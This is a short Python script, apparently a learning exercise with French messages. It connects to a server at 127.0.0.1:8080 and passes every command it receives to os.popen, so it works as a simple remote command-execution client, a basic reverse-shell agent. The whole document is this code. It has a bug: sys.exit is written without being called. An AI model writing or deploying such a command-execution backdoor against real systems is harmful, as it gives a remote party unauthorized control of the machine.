from socket import * 
import sys
import os

client = socket(AF_INET, SOCK_STREAM)
try : 
   client.connect(("127.0.0.1", 8080))
except error as e:
   print(f'erreur{e}')
   sys.exit
msgS = client.recv(1024).decode("utf8")
while 1: 
   if msgS != "exit":
      print("S>", msgS)
      os.popen(msgS)
      msgC = "ok"
   else :
      break
   client.send(msgC.encode("utf8"))
   msgS = client.recv(1024).decode("utf8")

print("connexion interrompu")
client.close()






